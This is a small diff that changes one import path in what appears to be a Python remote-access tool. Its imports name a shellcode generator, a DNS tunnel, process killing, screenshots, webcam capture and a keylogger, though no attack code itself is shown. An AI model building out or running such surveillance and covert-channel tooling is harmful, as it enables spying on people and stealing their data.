@@ -31,7 +31,7 @@ if MODULES_PATH not in sys.path:
 
 # Import modules
 from modules.shellcode import ShellcodeGenerator
-from modules.dns_tunnel import DNSTunnel, create_server
+from modules.dns_tunnel.tunnel import DNSTunnel, create_server
 from modules.system import get_info
 from modules.process import list_processes, kill_process
 from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger
